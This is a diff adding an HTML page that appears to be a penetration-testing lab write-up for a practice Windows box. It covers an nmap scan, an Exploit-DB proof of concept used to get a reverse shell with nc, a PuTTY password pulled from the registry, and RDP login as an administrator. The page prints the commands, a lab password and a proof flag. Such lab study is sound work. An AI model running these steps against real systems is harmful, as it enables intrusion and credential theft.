@@ -1,0 +1,141 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX145</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/145]
+└─$ sudo nmap -p- -sCV 192.168.214.145 --min-rate=10000              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 20:26 EST
+Nmap scan report for 192.168.138.145
+Host is up (0.17s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Samuel's Personal Site
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    system windows 6.2
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2025-09-18T02:02:28
+|_Not valid after:  2026-03-20T02:02:28
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2025-11-26T01:29:23+00:00
+|_ssl-date: 2025-11-26T01:30:03+00:00; +1s from scanner time.
+7680/tcp open  pando-pub?</code></pre></div>
+<p class="text">I searched port 1978's service, and found <a href="https://www.exploit-db.com/exploits/49601">this poc</a>.</p>
+<p class="text">I installed it with below command.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/145]
+└─$ wget https://www.exploit-db.com/download/49601</code></pre></div>
+
+<p class="text">Then, I re-wrote part like below:</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/A/145/1.png' %}" alt="">
+    <img src="{% static 'EthHack/images/A/145/2.png' %}" alt="">
+</div>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/145]
+└─$ python3 2.py 192.168.214.145 192.168.45.164 nc.exe
+[+] 3..2..1..
+[+] *Super fast hacker typing*
+[+] Done! Check Your Listener?</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/145]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.164] from (UNKNOWN) [192.168.214.145] 50659
+whoami
+oscp\offsec
+PS C:\WINDOWS\system32> </code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found PuTTY directory on program files folder.</p>
+<div class="code-box"><pre><code>PS C:\program files> dir
+
+
+    Directory: C:\program files
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          1/5/2023   5:05 AM                Common Files                                                         
+d-----         12/7/2019   1:51 AM                Internet Explorer                                                    
+d-----          1/5/2023   4:51 AM                Microsoft Update Health Tools                                        
+d-----         12/7/2019   1:14 AM                ModifiableWindowsApps                                                
+d-----        11/22/2021  12:35 AM                PuTTY                                                                
+d-----        11/22/2021  12:31 AM                ruxim                                                                
+d-----          1/5/2023   5:05 AM                UNP                                                                  
+d-----         7/30/2021   1:28 PM                VMware                                                               
+d-----          1/5/2023   5:10 AM                Windows Defender                                                     
+d-----         12/7/2019   1:54 AM                Windows Defender Advanced Threat Protection                          
+d-----         12/7/2019   1:14 AM                Windows Mail                                                         
+d-----         12/7/2019   1:54 AM                Windows Media Player                                                 
+d-----         12/7/2019   1:54 AM                Windows Multimedia Platform                                          
+d-----         12/7/2019   1:50 AM                Windows NT                                                           
+d-----         12/7/2019   1:54 AM                Windows Photo Viewer                                                 
+d-----         12/7/2019   1:54 AM                Windows Portable Devices                                             
+d-----         12/7/2019   1:31 AM                Windows Security                                                     
+d-----         12/7/2019   1:31 AM                WindowsPowerShell  </code></pre></div>
+
+<p class="text">This application often stores credential in HKCU hive.</p>
+<div class="code-box"><pre><code>PS C:\program files> gci HKCU:/software/simontatham/putty
+
+
+    Hive: HKEY_CURRENT_USER\software\simontatham\putty
+
+
+Name                           Property                                                                                
+----                           --------                                                                                
+Sessions                       zachary : "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r'                    
+                               zachary@10.51.21.12 'df -h'" </code></pre></div>
+
+<p class="text">I got zachary's password.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/145]
+└─$ xfreerdp3 /u:zachary /p:Th3R@tC@tch3r /v:192.168.214.145</code></pre></div>
+<p class="text">We was administrator.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> type proof.txt ;hostname;whoami;ipconfig
+789593fe37e57b60ea0bb3fe29b638b8
+oscp
+oscp\zachary
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.214.145
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254</code></pre></div>
+
+</body>
+</html>
